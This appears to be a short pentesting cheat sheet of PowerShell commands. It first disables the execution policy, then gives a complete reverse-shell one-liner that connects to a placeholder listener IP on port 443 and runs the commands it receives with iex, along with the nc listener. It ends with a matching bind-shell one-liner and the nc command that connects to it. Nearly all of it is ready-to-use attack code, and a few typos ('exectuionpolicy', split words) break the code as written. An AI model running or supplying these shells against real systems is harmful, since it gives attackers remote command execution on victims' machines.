# Powershell 

```powershell
# Set the execution policy to unrestricted. 
C:\> powershell
PS C:\> get-exectuionpolicy
PS C:\> Set-ExecutionPolicy Unrestricted
```

```powershell
# Powershell reverse shells
$ sudo nc -lnvp 443

# Send a reverse shell via one-liner
C:\> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<listener ip address',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out- String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush();}$client.Close()"
```

```powershell
# Powershell bind shells via listener
C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"

# Connect to the listener
$ nc -nv <listener ip address> 443
```
